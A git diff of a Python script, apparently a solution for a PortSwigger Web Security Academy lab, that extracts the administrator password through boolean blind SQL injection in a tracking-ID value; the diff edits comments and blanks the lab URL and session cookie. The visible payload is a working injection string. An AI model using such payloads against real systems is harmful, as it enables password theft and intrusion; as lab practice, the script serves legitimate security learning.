@@ -13,7 +13,7 @@ def test_sql_injection(url, session_cookie):
 
         for char in characters:
            
-           # change the payload
+           # change the payload : your trackingID
             sql_payload = (
                 f"bmaJJQR3l9KQ36vn' AND "
                 f"(SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--"
@@ -52,10 +52,10 @@ def test_sql_injection(url, session_cookie):
 
 def main():
     
-    # change the url, session cookie
+    # fill-in  the url, session cookie
 
-    url = "https://0a6c009604c6107080855843008d0094.web-security-academy.net"
-    session_cookie = "crbW7YhUoGGrx3zkgvM0VgUyyiIqn7sD"
+    url = " "
+    session_cookie = " "
 
     print("Starting SQL Injection Password Extraction...")
     extracted_password = test_sql_injection(url, session_cookie)
